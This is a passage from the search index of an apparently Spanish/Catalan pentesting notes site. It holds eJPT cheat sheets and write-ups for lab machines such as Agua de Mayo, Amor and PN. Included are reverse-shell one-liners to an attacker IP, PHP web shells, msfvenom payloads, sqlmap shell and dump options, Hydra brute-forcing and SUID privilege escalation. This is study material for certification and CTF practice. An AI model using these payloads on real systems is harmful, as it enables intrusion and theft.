2&gt;&amp;1|nc **IP Port** &gt;/tmp/f\n\nbash -i &gt;&amp; /dev/tcp/**IP**/**Port** 0&gt;&amp;1\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#webshell","title":"WebShell","text":"<p>Cmd</p> <pre><code>&lt;?php echo \"&lt;pre&gt;\" . system($_GET['cmd']) . \"&lt;/pre&gt;\"; ?&gt;\n\n# NOTA': Puede que si no se interpreta, haya que encodear el ? de la url por un &amp;\n\n&lt;%3Fphp echo \"&lt;pre&gt;\" . system($_GET['cmd']) . \"&lt;/pre&gt;\"; %3F&gt;\n\n# Con shell_exec\n\n&lt;?php echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\"; ?&gt;\n</code></pre> <p>Cmd search bar</p> <pre><code>&lt;html&gt;\n&lt;body&gt;\n&lt;form method=\"GET\" name=\"&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;\"&gt;\n&lt;input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"&gt;\n&lt;input type=\"SUBMIT\" value=\"Execute\"&gt;\n&lt;/form&gt;\n&lt;pre&gt;\n&lt;?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?&gt;\n&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Revershell PHP</p> <pre><code>&lt;?php exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/**ATTACKING IP**/**PORT** 0&gt;&amp;1'\");?&gt;\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#revershell-windows","title":"Revershell Windows","text":"<p>Metasploit shell</p> <pre><code>#Parte 1\nmsfvenom  -p windows/meterpreter/reverse_tcp LHOST=LocalIP LPORT=4444 -f exe -o payload.exe\n\n#Parte 2\nmsfconsole&gt; use multi/handler\nmsfconsole&gt;show options\nmsfconsole&gt;set LHOST=LocalIP\nmsfconsole&gt;set LPORT=4444\nmsfconsole&gt;set PAYLOAD windows/meterpreter/reverse_tcp\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>View Listen services with port</p> <pre><code>ss -tl\n</code></pre> <p>Sudo </p> <pre><code>sudo -l\n</code></pre> <p>Capabilities</p> <pre><code>getcap -r / 2&gt;/dev/null\n</code></pre> <p>SUID</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> <pre><code>find / -perm -4000 2&gt;/dev/null\n</code></pre> <p>Windows (Metasploit)</p> <pre><code># Una vez tenemos acceso a la maquina con alg\u00fan usuario a traves de metasploit, \n# podemos usar el siguiente modulo\nmeterpreter&gt;backgound\nmsf6&gt; sessions -l \n1\nmsf6&gt; use local_exploit_suggester\nmsf6&gt; set SESSION 1\nmsf6&gt; run\n</code></pre> <p>Python Library Hijacking</p> <pre><code># Si encontramos un script de python importanto modulos\n\nuser&gt; sudo -l\n    (root): /usr/bin/python3 /opt/scripts/example.py\n\nuser&gt; cat example.py  \nexample.py:\n#!/usr/bin/bash\nimport random\nprint(random.randint(1, 8))\n\n# Podemos crear un script malicioso en python con el mismo nombre que el modulo que \n# importa, de esta manera , se ejecutara antes que el resto y con permisos de root\n# En este caso importa el modulo: random\n\nuser&gt; touch /opt/scripts/random.py\n\n#!/usr/bin/bash\nimport os\nos.system(\"/bin/bash\")\n#Para una rever : \n# os.system('bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/&lt;ATTACING_IP&gt;/9001 0&gt;&amp;1\"')\n\nuser&gt; sudo  /usr/bin/python3 /opt/scripts/example.py\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/","title":"Web Pentesting","text":""},{"location":"Apuntes/eJPT/WebPentesting/#web-application-enumeration-checklist","title":"Web Application Enumeration Checklist:","text":"<pre><code>1. Checkout the entire webpage and what it is displaying.\n2. Read every page, look for emails, names, user info, etc.\n3. Directory Discovery (time to dir bust!)\n4. Enumerate the interface, what is the CMS &amp; Version? Server installation page?\n5. Check for potential Local File Inclusion, Remote File Inclusion, SQL Injection, XXE, and Upload vulnerabilities\n6. Check for a default server page, identify the server version\n7. View Source Code:\n      a. Check for hidden values\n      b. Check for comments/developer remarks\n      c. Check for Extraneous Code\n      d. Check for passwords\n8. Check for robots.txt file\n9. Web Scanning\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#directory-discoverydir-busting","title":"Directory Discovery/Dir Busting:","text":"<pre><code>gobuster dir -u $IP -w /usr/share/seclists/Discovery/Web-Content/common.txt\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#gobuster-quick-directory-discovery","title":"Gobuster Quick Directory Discovery","text":"<pre><code>gobuster -u $ip -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#gobuster-directory-busting","title":"Gobuster Directory Busting:","text":"<pre><code>wget &lt;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Top1000-RobotsDisallowed.txt&gt;; gobuster -u &lt;http://10.10.10.10&gt;. -w Top1000-RobotsDisallowed.txt\n</code></pre> <pre><code>gobuster dir -u &lt;http://$ip&gt; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o gobuster-root -t 50\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#gobuster-comprehensive-directory-busting","title":"Gobuster comprehensive directory busting:","text":"<pre><code>gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#gobuster-search-with-file-extension","title":"Gobuster search with file extension:","text":"<pre><code>gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#wfuzz-search-with-files","title":"wfuzz search with files:","text":"<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200 &lt;http://10.10.10.10/FUZZ&gt;\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#if-you-are-really-stuck-run-this","title":"If you are really stuck, run this:","text":"<pre><code>for file in $(ls /usr/share/seclists/Discovery/Web-Content); do gobuster -u &lt;http://$ip/&gt; -w /usr/share/seclists/Discovery/Web-Content/$file -e -k -l -s \"200,204,301,302,307\" -t 20 ; done\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#check-different-extensions","title":"Check different extensions:","text":"<pre><code>sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#sql-injection-testing-automated","title":"SQL Injection Testing (automated!)","text":""},{"location":"Apuntes/eJPT/WebPentesting/#if-you-follow-the-above-check-list-you-should-have-a-list-of-parameters-to-test-for-sql-injection-automate-it-with-sqlmap","title":"if you follow the above check list, you should have a list of parameters to test for SQL injection. Automate it with SQLMAP!","text":""},{"location":"Apuntes/eJPT/WebPentesting/#sqlmap-commands","title":"SQLmap Commands:","text":"<pre><code>sqlmap -u &lt;http://10.10.10.10&gt; -p parameter\nsqlmap -u &lt;http://10.10.10.10&gt;  --data POSTstring -p parameter\nsqlmap -u &lt;http://10.10.10.10&gt; --os-shell\nsqlmap -u &lt;http://10.10.10.10&gt; --dump\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#checklist","title":"Checklist","text":"<p>Fichero de passwords</p> <pre><code>/var/www/html/.htpasswd\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#bruteforce-login-panel","title":"Bruteforce Login Panel","text":"<ul> <li> <p>Burpsuite</p> <p>Capturamos la petici\u00f3n con Burpsuite con cualquier credencial.</p> <p>Mandamos al Intruder</p> <p>Establecemos con el tipo de ataque (Sniper attack para un campo si conocemos usuario o Cluster Bomb para probar combinaciones de usuario/password</p> <p>A\u00f1adimos $ para marcar los campos a atacar (username y password)</p> <p>En Payloads cargamos los diccionarios</p> <p></p> </li> <li> <p>Hydra</p> <pre><code>hydra -L &lt;users_file&gt; -P &lt;password_file&gt; &lt;url&gt; http[s]-[post|get]-form \n\"index.php:param1=value1&amp;param2=value2&amp;user=^USER^&amp;pwd=^PASS^&amp;paramn=valn:[F|S]=messageshowed\"\n\n-e ns : \nPrueba nombres de usuario vac\u00edos (n) y contrase\u00f1as vac\u00edas (s). Es \u00fatil para detectar configuraciones por defecto o credenciales vac\u00edas.\n\n-F: \nFinaliza el ataque en cuanto encuentra una combinaci\u00f3n v\u00e1lida de usuario y contrase\u00f1a.\n\n-u:\nIntenta un usuario a la vez antes de pasar al siguiente (en lugar de probar todas las contrase\u00f1as con cada usuario).\n\nEX HTTP GET LOGIN \n\nhydra -l admin -P /root/Desktop/wordlists/test.txt http://www.website.com \nhttp-get-form \"/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.\"\n\nhydra  -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/rockyou-40.txt -e ns -F -u -v 192.168.1.44  http-get-form \n\"/DVWA/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=Welcome to the password protected area:H=Cookie\\: security=low; PHPSESSID=${SESSIONID}\"\n\nEX HTTP POST LOGIN\n</code></pre> <p>Ejemplo:</p> <pre><code>Para panel de login: Capturamos peticion de Burpsuite para ver todos los campos\n\nEjemplo de petici\u00f3n :\n\nGET /vulnerabilities/brute/?username=test&amp;password=\u00a7test\u00a7&amp;Login=Login HTTP/1.1\nHost: 127.8.0.1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nReferer: http://127.8.0.1/vulnerabilities/brute/\nCookie: PHPSESSID=dsq1vaq210onuch60f38cpq6i4; security=low\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\n\nHydra: A\u00f1adimos toda la info, separada por : y cambiamos username y password por variables para fuzzear ^USER^ y ^PASS^ y con el parametro F(Follow) a\u00f1adimos la respuesta de password incorrecto que muesta. ('Username and/or password incorrect')\n\n$&gt; hydra -t16 -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.8.0.1/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:H=Cookie\\:PHPSESSID=dsq1vaq210onuch60f38cpq6i4;security=low:F=Username and/or password incorrect.'\n</code></pre> </li> <li></li> </ul> <pre><code>burpsuite\n</code></pre>"},{"location":"Apuntes/eJPT/WebPentesting/#fuzzing","title":"Fuzzing","text":""},{"location":"Blog/","title":"{{ title }}","text":"<p>\ud83d\udcc5 Publicado el: {{ date }}</p>","tags":["ctf","seguridad","linux"]},{"location":"Blog/#introduccion","title":"\ud83d\uddd2\ufe0f Introducci\u00f3n","text":"<p>Contextualiza la entrada: \u00bfQu\u00e9 est\u00e1s tratando? \u00bfPor qu\u00e9 es relevante? \u00bfCu\u00e1l es el objetivo de este post?</p>","tags":["ctf","seguridad","linux"]},{"location":"Blog/#detalles-tecnicos","title":"\ud83d\udee0\ufe0f Detalles t\u00e9cnicos","text":"<p>Describe paso a paso lo que hiciste o lo que ocurri\u00f3:</p>","tags":["ctf","seguridad","linux"]},{"location":"Blog/#reconocimiento","title":"\ud83d\udd0d Reconocimiento","text":"<p>```bash nmap -sC -sV -oN scan.txt 10.10.10.10</p>","tags":["ctf","seguridad","linux"]},{"location":"Blog/Segona-entrada/","title":"Segona entrada","text":"<p>\ud83d\udcc5 Publicado el: 2025-05-02</p>","tags":["ejemplo"]},{"location":"Blog/Segona-entrada/#introduccion","title":"\ud83d\uddd2\ufe0f Introducci\u00f3n","text":"<p>Primera nota publicada en el blog</p>","tags":["ejemplo"]},{"location":"Blog/Segona-entrada/#comparte-esta-entrada","title":"\ud83d\udce2 Comparte esta entrada","text":"<p>Compartir nota</p>","tags":["ejemplo"]},{"location":"Blog/plantilla_notas/","title":"{{ title }}","text":"<p>\ud83d\udcc5 Publicado el: {{ date }}</p>","tags":["ctf","seguridad","linux"]},{"location":"Blog/plantilla_notas/#introduccion","title":"\ud83d\uddd2\ufe0f Introducci\u00f3n","text":"<p>Contextualiza la entrada: \u00bfQu\u00e9 est\u00e1s tratando? \u00bfPor qu\u00e9 es relevante? \u00bfCu\u00e1l es el objetivo de este post?</p>","tags":["ctf","seguridad","linux"]},{"location":"Blog/plantilla_notas/#detalles-tecnicos","title":"\ud83d\udee0\ufe0f Detalles t\u00e9cnicos","text":"<p>Describe paso a paso lo que hiciste o lo que ocurri\u00f3:</p>","tags":["ctf","seguridad","linux"]},{"location":"Blog/plantilla_notas/#reconocimiento","title":"\ud83d\udd0d Reconocimiento","text":"<p>```bash nmap -sC -sV -oN scan.txt 10.10.10.10</p>","tags":["ctf","seguridad","linux"]},{"location":"Recursos/info/","title":"\ud83d\udee0\ufe0f Recursos","text":"<p>Herramientas y recursos \u00fatiles para usar en ejercicios de pentesting.</p>"},{"location":"Recursos/info/#herramientas-de-uso-diario","title":"\ud83e\uddf0 Herramientas de uso diario","text":"<p>\ud83d\udcc4 Ver</p>"},{"location":"Recursos/info/#cheatsheets","title":"\ud83d\udcce CheatSheets","text":"<p>\ud83d\udcc4 Ver</p>"},{"location":"Recursos/info/#osint","title":"\ud83d\udd75\ufe0f OSINT","text":"<p>\ud83d\udcc4 Ver</p>"},{"location":"Recursos/info/#enumeracion-explotacion","title":"\ud83e\uddea Enumeraci\u00f3n &amp; Explotaci\u00f3n","text":"<p>\ud83d\udcc4 Ver</p>"},{"location":"Recursos/info/#enlaces-utiles","title":"\ud83d\udd17 Enlaces \u00fatiles","text":"<p>\ud83d\udcc4 Ver</p>"},{"location":"Recursos/info/#en-construccion","title":"\ud83d\udccc En construcci\u00f3n...","text":"<p>Esta secci\u00f3n est\u00e1 en constante evoluci\u00f3n, como cualquier buen arsenal.</p>"},{"location":"Writeup-ctfs/info/","title":"Info","text":"<p>Resoluci\u00f3n de entornos vulnerables de las principales plataformas de la comunidad</p> <ul> <li>Dockerlabs</li> <li>HackerLabs</li> <li>HackTheBox</li> <li>TryHackMe</li> </ul>"},{"location":"Writeup-ctfs/BunkerLabs/Document/","title":"Document","text":""},{"location":"Writeup-ctfs/BunkerLabs/Document/#1-informacion-inicial","title":"1. Informaci\u00f3n Inicial","text":"<p>Desplegamos la maquina con docker</p> <pre><code>M\u00e1quina desplegada, su direcci\u00f3n IP es --&gt; 172.17.0.2\n</code></pre>"},{"location":"Writeup-ctfs/BunkerLabs/Document/#2-reconocimiento-recon","title":"2. Reconocimiento (Recon)","text":""},{"location":"Writeup-ctfs/BunkerLabs/Document/#21-escaneo-de-puertos","title":"2.1 Escaneo de Puertos","text":"<ul> <li>[x] Nmap inicial:</li> </ul> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts \n</code></pre> <p>Allports</p> <pre><code>PORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\n</code></pre> <p>Puertos Abiertos:  [Puerto 22]:</p> <ul> <li>[x] Nmap serveis/versions:</li> </ul> <pre><code>sudo nmap -sCV -p22,80 172.17.0.2 -oN targeted\n</code></pre> <p>Puertos Abiertos:  [Puerto 22]  OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)  [Puerto 80] 80/tcp open  http    Apache httpd 2.4.62 ((Debian))</p>"},{"location":"Writeup-ctfs/BunkerLabs/Document/#2-enumeracion-web","title":"2 Enumeraci\u00f3n (Web)","text":"<p> Analizamos con Burpsuite</p> <p>  Vemos que para cada petici\u00f3n , genera un ID  Vamos a tratar de encontrar ID's generados y ver si contienen algo</p> <p>Mandamos la petici\u00f3n al Intruder Creamos un ataque tipo \"Sniper\" de tipo \"Numerico\" Configuramos del 1 al 1000</p> <p></p> <p>En los resultados, ya vemos que por tama\u00f1o de respuesta, el ID 21 muestra algo distinto: (Tama\u00f1o 16679) </p> <p>Comprovamos el ID:  ~~~~</p> <p>Encontramos login y password</p>"},{"location":"Writeup-ctfs/BunkerLabs/Document/#4-explotacion-exploit","title":"4. Explotaci\u00f3n (Exploit)","text":"<p>Probamos a ingresar por SSH con ese usuario y contrase\u00f1a, dado que tiene el puerot 22 abierto</p> <p></p> <p>Accedemos a la maquina como Pepe.</p>"},{"location":"Writeup-ctfs/BunkerLabs/Document/#5-escalada-de-privilegios","title":"**5. Escalada de privilegios","text":"<p>Ahora, una vez dentro como Pepe, vamos probar a escalar nuestros privilegios</p> <p>Buscamos permisos SUID</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/umount\n/usr/bin/chsh\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/php8.2\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n</code></pre> <p>Encontramos `/usr/bin/php8.2 Buscamos en GTFObins</p> <pre><code>./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n</code></pre> <p>Explotamos</p> <pre><code>pepe@278b98666e01:/usr/bin$ ./php8.2 -r \"pcntl_exec('/bin/sh', ['-p']);\"\n# whoami\nroot\n</code></pre>"},{"location":"Writeup-ctfs/BunkerLabs/Document/#6-lecciones-aprendidas","title":"6. Lecciones Aprendidas","text":"<p>- - IDOR en documentos PDF</p>"},{"location":"Writeup-ctfs/BunkerLabs/Document/#7-recursos","title":"7. Recursos","text":"<ul> <li>Referencias:</li> <li> <p>GTFObins  </p> </li> <li> <p>Herramientas Utilizadas:</p> </li> <li>Nmap</li> <li>Burpsuite</li> </ul>"},{"location":"Writeup-ctfs/DockerLabs/Agua%20de%20Mayo/","title":"Agua de Mayo","text":"<p>Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:18</p>"},{"location":"Writeup-ctfs/DockerLabs/Agua%20de%20Mayo/#reconeixement-reconocimiento","title":"Reconeixement / Reconocimiento","text":""},{"location":"Writeup-ctfs/DockerLabs/Agua%20de%20Mayo/#nmap","title":"NMAP","text":"<pre><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 172.17.0.2 -oG allports\n</code></pre> <pre><code>sudo nmap -p22,80 -sCV 172.17.0.2 -oN targeted\n</code></pre> <pre><code>sudo nmap -p80 --script=http-enum 172.17.0.2\n</code></pre> <p>Directorio : /images/</p> <p>Trobem una imatge / Encontramos una imagen :</p> <p>Agua_ssh</p>"},{"location":"Writeup-ctfs/DockerLabs/Agua%20de%20Mayo/#analisis-de-vulnerabilitats-analisis-de-vulnerabilidades","title":"An\u00e0lisis de vulnerabilitats / An\u00e1lisis de vulnerabilidades","text":"<p>Provem de veure si cont\u00e9 dades / Probamos a ver si contiene datos:</p> <pre><code>steghide info agua_ssh.jpg\nDemana password\n</code></pre> <p></p> <p>Revisem la web per veure si trobem algo al codi / Revisamos la web para ver si encontramos algo en el c\u00f3digo:</p> <pre><code>curl -s -X GET [http://172.17.0.2/](http://172.17.0.2/)\n</code></pre> <p>Ens troba una \u00faltima linea / Econtramos en la \u00faltima linia:</p> <p>++++++++++[&gt;++++++++++&gt;++++++++++&gt;++++++++++&gt;++++++++++&gt;++++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++&gt;+++++++++++&gt;++++++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;--.&gt;+.&gt;--.&gt;+.&gt;---.&gt;+++.&gt;---.&gt;---.&gt;+++.&gt;---.&gt;+..&gt;-----..&gt;---.&gt;.&gt;+.&gt;+++.&gt;.</p> <p>Busquem un decode / Buscamos un Decoder: Codi BrainFuck</p> <p>Decodifiquem i surt:</p> <p>be**no</p>"},{"location":"Writeup-ctfs/DockerLabs/Agua%20de%20Mayo/#explotacio-explotacion","title":"Explotaci\u00f3 / Explotaci\u00f3n","text":"<p>Conectem per SSH amb usuari \"Agua\" de la imatge i el password de la web / Conectamos por SSH con usuario \"Agua\" y el password decodificado de Brainfuck</p> <pre><code>ssh [agua@172.17.0.2](mailto:agua@172.17.0.2)\n</code></pre> <p></p> <p>Provem a buscar permisos amb Sudo / Probamos a buscar permisos con sudo</p> <p></p> <p>Podem executar \"bettercap\" sense password i com a root /  Podemos ejecutar \"bettercap\" sin passowrd como usuario root</p> <pre><code>sudo bettercap\n</code></pre> <p></p> <p>Veiem que es poden executar instruccions amb <code>!cmd</code> / Vemos que podemos ejecutar comoandos como root con <code>!cmd</code></p>"},{"location":"Writeup-ctfs/DockerLabs/Agua%20de%20Mayo/#escalada-de-privilegis-escalada-de-privilegios","title":"Escalada de privilegis / Escalada de privilegios","text":"<p>Provem amb <code>!whoami</code> i veiem que ja som root / Probamos con <code>!whoami</code> y vemos que somos root</p> <p></p> <p>Per mirar de tenir una shell mes operativa done permis SUID a la bash / Para tener una shell mas operativa, damos permiso SUID a la bash con:</p> <pre><code>! chmod +s /bin/bash\n</code></pre> <p>Sortim de bettercap i provem la shell / Salimos de bettercap y probamos la shell</p> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Amor/","title":"Amor","text":"<p>Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:10</p>"},{"location":"Writeup-ctfs/DockerLabs/Amor/#reconocimiento","title":"Reconocimiento","text":""},{"location":"Writeup-ctfs/DockerLabs/Amor/#nmap","title":"NMAP","text":"<pre><code>sudo nmap -p- -sS -sCV --min-rate 5000 -vvv  -n -Pn 172.17.0.2 -oG allports\n</code></pre> <pre><code>sudo nmap -sCV -p22,80 172.17.0.2 -oN targeted\ncat targeted -l ruby\n</code></pre> <p>Web :</p> <p></p> <p>Posibles usuarios:</p> <p>Carlota Juan</p>"},{"location":"Writeup-ctfs/DockerLabs/Amor/#probamos-posibles-usuarios-con-ssh","title":"Probamos posibles usuarios con SSH","text":""},{"location":"Writeup-ctfs/DockerLabs/Amor/#fuzzing-web","title":"Fuzzing WEB","text":"<pre><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u [http://172.17.0.2/](http://172.17.0.2/) -x html,php,php7,txt,py\n</code></pre> <p>Fuff para encontrar directorios:</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \"[http://172.17.0.2/FUZZ](http://172.17.0.2/FUZZ)\" -recursion -recursion-depth 2 -c -ic -v\n</code></pre>"},{"location":"Writeup-ctfs/DockerLabs/Amor/#explotacion","title":"Explotaci\u00f3n","text":"<p>Probamos hydra con los usuarios encontrados: Juan : no troba pass</p> <p>Carlota: b**l</p> <p>Probamos la conexi\u00f3n SSH Ingresamos como Carlota y encontramos archivo:</p> <p></p> <p>Descargamos archivo con:</p> <pre><code>ssh [carlota@172.17.0.2](mailto:carlota@172.17.0.2) 'cat /home/carlota/Desktop/fotos/vacaciones/imagen.jpg' &gt; /home/fil/Desktop/docker/imagen.jpg\n</code></pre> <p>Miramos el contenido con Exiftool, pero no encontramos nada</p> <p></p> <p>Encontramos otro usuario:</p> <p>oscar</p> <p>Probamos con hidra</p> <pre><code>hydra -l oscar -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -vV\n</code></pre> <p>No encontramos nada</p> <p>Intentamos extraer informaci\u00f3n con:</p> <pre><code>sudo steghide extract -sf imagen.jpg\n</code></pre> <p>Encontramos archivo secret.txt</p> <p></p> <p>ZXNsYWNhc2FkZXBpbnlwb24=</p> <p>Decodificamos cadena con:</p> <p>echo \"ZXNsYWNhc2FkZXBpbnlwb24=\" | base64 -d; echo</p> <p>ZXNsYWNhc2FkZXBpbnlwb24= es**pon</p> <p>Intentamos esta contrase\u00f1a con el otro usuario</p> <p>Oscar es**pon</p> <p>Entramos por SSH</p> <pre><code>ssh [oscar@172.17.0.2](mailto:oscar@172.17.0.2)\nPass: es************pon\n</code></pre> <p>Buscamos ficheros:</p> <p></p> <p>En el escritorio hay un txt:</p> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Amor/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Buscamos permisos con SUDO</p> <pre><code>Sudo -l\n</code></pre> <p></p> <p>Podemos explotar: ruby</p> <p>Buscamos enn GTOBINS:</p> <p></p> <p>Ejecutamos :</p> <p></p> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Chocolate/","title":"Chocolate","text":"<p>Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:03</p> <p>Reconocimiento</p> <pre><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv  -n 172.17.0.2 -oG allports\n</code></pre> <p></p> <p>Miramos c\u00f3digo fuente y encontramos:</p> <p></p> <p>Entramos a :</p> <p>http://172.17.0.2/nibbleblog/</p> <p></p> <p>Encontramos panel de login</p> <p></p> <p>Credenciales por defecto : admin/admin Encontramos versi\u00f3n :</p> <p></p> <p>Buscamos exploit Provamos con metasploit</p> <p></p> <p>Configuramos par\u00e1metros:</p> <p>Usuari: admin Pass: admin RHOST: 172.17.0.2</p> <p>Falla Vemos que el exploit usa la ruta del Plugin \"My_image\" Instalamos el plugin en la web Ejecutamos exploit</p> <p>Accedemos y realizamos el tratamiento de la TTY </p> <p>Somos usuari www-data</p> <pre><code>sudo -l :\n</code></pre> <p></p> <p>El usuario \"chocolate\" puede usar el binario PHP como Root</p> <p>Buscamos en GTFObins</p> <p></p> <p>Para hacerlo con el usuario \"chocolate\" y que no pida password:</p> <p></p> <p>Somo usuario chocolate</p> <p>Vemos con ps -aux que corre un script php como root</p> <p></p> <p>/opt/script.php</p> <p>Modificamos el fichero:</p> <p>echo '' &gt; /opt/script.php</p> <p>Comprobamos que ha cambiado la bash:</p> <p></p> <p>Con el permiso sudoer:</p> <p></p> <p>Ya con la bash modificada hacemos:</p> <p>bash -p root</p> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Library/","title":"Library","text":"<p>Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:23</p>"},{"location":"Writeup-ctfs/DockerLabs/Library/#reconeixement","title":"Reconeixement","text":""},{"location":"Writeup-ctfs/DockerLabs/Library/#nmap","title":"NMAP","text":"<pre><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 172.17.0.2 -oG allports\n</code></pre> <pre><code>sudo nmap -p22,80 -sCV 172.17.0.2 -oN targeted\n</code></pre> <p>Fem fuzzing a la web:</p> <p>Trobem :</p> <p></p> <p>Al codi font de Index.php : J*****D</p> <p>Trobem</p> <p>/javascrip/jquery/jquery/</p> <p>Trobem un script que no sembla que serveixi per res</p> <p>Provem for\u00e7a bruta amb el possible login de la web index.php</p> <pre><code>hydra -L /usr/share/wordlists/rockyou.txt -p J**********D 172.17.0.2 ssh -vV\n</code></pre> <p>User: c****s</p> <p></p> <p>Conectem per ssh :</p> <p>Usuari: c****s</p> <p>Password: J**D</p> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Library/#explotacio","title":"Explotacio","text":"<pre><code>sudo -l\n</code></pre> <p>Veiem que crida al script :</p> <p>/opt/script.py</p> <p>https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/</p> <p>Veiem que podem eliminar el script i crear un nou amb la ordre de cridar a una bash:</p> <p></p> <p>Script original:</p> <p></p> <p>creem el script.py</p> <p></p> <p>i executem el scrip amb sudo</p> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/PN/","title":"PN","text":"<p>Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 17:37</p>"},{"location":"Writeup-ctfs/DockerLabs/PN/#reconeixement","title":"Reconeixement","text":"<pre><code>sudo nmap -p- -sS -sCV --min-rate 5000 -vvv  -n -Pn 172.17.0.2 -oG allports\n</code></pre> <p>No troba res Provem a treure el parametre -Pn</p> <p></p> <p>Ens conectem a la web i trobem un tomcat</p> <p></p> <p>Provem a accedir al panell manager. Demana login Provem amb credencials per defecte:</p> <p></p> <p>Accedirm amb tomact:s3cr3t</p> <p>Un cop a dins , mirem de pujar un fitxer .war</p> <p>Creem el payload amb :</p> <p>msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.1.7 lport=1234 -f war &gt; shell.war</p> <p>Pujem el fitxer :</p> <p>.</p> <p></p> <p>Explotem la shell</p> <p></p> <p>Entrem com a root</p>"},{"location":"Writeup-ctfs/DockerLabs/ShowTime/","title":"ShowTime","text":"<p>Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 